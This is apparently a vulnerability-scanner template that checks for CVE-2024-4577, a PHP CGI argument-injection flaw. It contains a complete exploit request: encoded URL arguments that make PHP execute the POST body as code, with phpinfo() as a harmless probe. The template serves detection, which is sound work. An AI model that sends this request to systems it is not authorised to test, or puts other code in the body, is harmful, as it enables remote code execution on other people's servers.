id: rce

info:
  name: CVE-2024-4577 PHP CGI argument Injection 
  author: B0d4
  severity: critical
  description: critical vulnerability in PHP affecting CGI configurations, allowing attackers to execute arbitrary commands via crafted URL parameters
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4577
  tags: 
    - attack
    - php
    - input

requests:
  - method: POST
    path:
      - "{{BaseURL}}/test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
    headers:
      User-Agent: "curl/8.3.0"
      Accept: "*/*"
      Content-Type: "application/x-www-form-urlencoded"
      Connection: "keep-alive"
    body: |
      <?php
      phpinfo();
      ?>
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Version"
        part: body
      - type: status
        status:
          - 200
